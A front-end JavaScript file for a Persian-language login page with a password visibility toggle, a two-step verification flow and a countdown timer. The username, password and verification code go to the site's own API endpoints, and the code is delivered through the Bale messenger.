const passwordInput = document.getElementById('password');
const lockIcon = document.querySelector('.lock-icon');
const eyeIcon = document.getElementById('password-toggle');

// مدیریت نمایش آیکون‌ها بر اساس فوکوس و محتوا
passwordInput.addEventListener('focus', () => {
  lockIcon.style.display = 'none';
  if (passwordInput.value.length > 0) {
    eyeIcon.style.display = 'block';
  }
});

passwordInput.addEventListener('blur', () => {
  if (passwordInput.value.length === 0) {
    lockIcon.style.display = 'block';
  }
  eyeIcon.style.display = 'none';
});

passwordInput.addEventListener('input', () => {
  if (passwordInput.value.length > 0) {
    lockIcon.style.display = 'none';
    if (document.activeElement === passwordInput) {
      eyeIcon.style.display = 'block';
    }
  } else {
    lockIcon.style.display = 'block';
    eyeIcon.style.display = 'none';
  }
});

// مدیریت نمایش/مخفی کردن رمز
eyeIcon.addEventListener('click', function() {
  const icon = this.querySelector('i');
  
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    icon.classList.replace('fa-eye', 'fa-eye-slash');
  } else {
    passwordInput.type = 'password';
    icon.classList.replace('fa-eye-slash', 'fa-eye');
  }
});

// مقداردهی اولیه
lockIcon.style.display = 'block';
document.getElementById('password').addEventListener('blur', () => {
  icon.classList.remove('fa-eye');
  icon.classList.remove('fa-eye-slash');
});

// Timer variables
let timerInterval;
let timeLeft = 120; // 2 minutes

// Function to start timer
function startTimer() {
    clearInterval(timerInterval);
    timeLeft = 120;
    updateTimerDisplay();
    
    timerInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            showFailure('زمان وارد کردن کد به پایان رسید!');
        }
    }, 1000);
}

// Function to update timer display
function updateTimerDisplay() {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    document.getElementById('timer').textContent = 
        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Success message display function
function showSuccess(message) {
    Swal.fire({
        icon: 'success',
        title: 'موفقیت',
        text: message,
        confirmButtonText: 'باشه'
    });
}

// Error message display function
function showError(message) {
    Swal.fire({
        icon: 'error',
        title: 'خطا',
        text: message,
        confirmButtonText: 'باشه'
    });
}

// Function to show verification step
function showVerification() {
    document.getElementById('login-container').classList.add('d-none');
    document.getElementById('verify-container').classList.remove('d-none');
    startTimer();
}

// Function to show final success
function showFinalSuccess() {
    document.getElementById('verify-container').classList.add('d-none');
    document.getElementById('success-container').classList.remove('d-none');
    clearInterval(timerInterval);
}

// Function to show failure
function showFailure(message) {
    document.getElementById('failure-reason').textContent = message;
    document.getElementById('verify-container').classList.add('d-none');
    document.getElementById('failure-container').classList.remove('d-none');
    clearInterval(timerInterval);
}

// Function to reset forms
function resetForms() {
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    document.getElementById('verification-code').value = '';
    clearInterval(timerInterval);
    
    // Reset password icon
    const passwordInput = document.getElementById('password');
    const icon = document.querySelector('#password-toggle i');
    passwordInput.type = 'password';
    icon.classList.remove('fa-eye-slash');
    icon.classList.add('fa-eye');
    
    // Return to login page
    document.getElementById('success-container').classList.add('d-none');
    document.getElementById('failure-container').classList.add('d-none');
    document.getElementById('login-container').classList.remove('d-none');
}

// Login form submission
document.getElementById('login-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username, password })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showVerification();
        } else {
            showError(data.message);
        }
    } catch (error) {
        showError('خطا در ارتباط با سرور');
        console.error('Login error:', error);
    }
});

// Verification code submission
document.getElementById('verify-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const code = document.getElementById('verification-code').value;
    
    try {
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ code })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showFinalSuccess();
        } else {
            showError(data.message);
        }
    } catch (error) {
        showError('خطا در ارتباط با سرور');
        console.error('Verification error:', error);
    }
});

// Resend code
document.getElementById('resend-code').addEventListener('click', async function() {
    try {
        const response = await fetch('/api/resend', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        const data = await response.json();
        
        if (data.success) {
            startTimer();
            Swal.fire({
                icon: 'success',
                title: 'کد جدید ارسال شد',
                text: 'کد تأیید جدید به پیام‌رسان بله شما ارسال شد',
                confirmButtonText: 'باشه'
            });
        } else {
            showError(data.message);
        }
    } catch (error) {
        showError('خطا در ارتباط با سرور');
        console.error('Resend error:', error);
    }
});
// Return to login page
document.getElementById('back-to-login').addEventListener('click', resetForms);
document.getElementById('try-again').addEventListener('click', resetForms);